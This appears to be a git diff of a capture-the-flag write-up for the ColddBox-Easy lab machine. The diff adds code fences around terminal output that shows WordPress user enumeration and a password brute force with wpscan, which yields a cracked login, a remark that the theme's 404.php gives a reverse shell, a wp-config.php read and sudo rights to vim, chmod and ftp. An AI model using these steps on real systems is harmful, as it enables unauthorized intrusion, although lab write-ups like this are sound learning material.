@@ -1,3 +1,4 @@
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ wpscan --url http://10.201.107.113 -e u
 _______________________________________________________________
@@ -98,7 +99,9 @@ Interesting Finding(s):
 [+] Data Received: 264.861 KB
 [+] Memory used: 189.461 MB
 [+] Elapsed time: 00:00:24
+```
 ==========================================================================================================================================
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ wpscan --url http://10.201.107.113 --passwords /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt 
 _______________________________________________________________
@@ -199,10 +202,12 @@ Interesting Finding(s):
  | Confirmed By: Login Error Messages (Aggressive Detection)
 
 [+] Performing password attack on Wp Login against 4 user/s
-[SUCCESS] - c0ldd / 9876543210 
+[SUCCESS] - c0ldd / 9876543210
+```
 ==================================================================================================================================================
 http://10.201.107.113/wp-content/themes/twentyfifteen/404.php BY visiting this can give me the reverse shell
 ==================================================================================================================================================
+```bash
 www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php 
 <?php
 /**
@@ -287,7 +292,9 @@ define('WP_SITEURL', '/');
 
 /** Sets up WordPress vars and included files. */
 require_once(ABSPATH . 'wp-settings.php');
+```
 ===========================================================================================================================
+```bash
 c0ldd@ColddBox-Easy:~$ sudo -l
 [sudo] password for c0ldd: 
 Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
@@ -298,4 +305,5 @@ El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
     (root) /usr/bin/vim
     (root) /bin/chmod
     (root) /usr/bin/ftp
-c0ldd@ColddBox-Easy:~$ 
+c0ldd@ColddBox-Easy:~$
+```
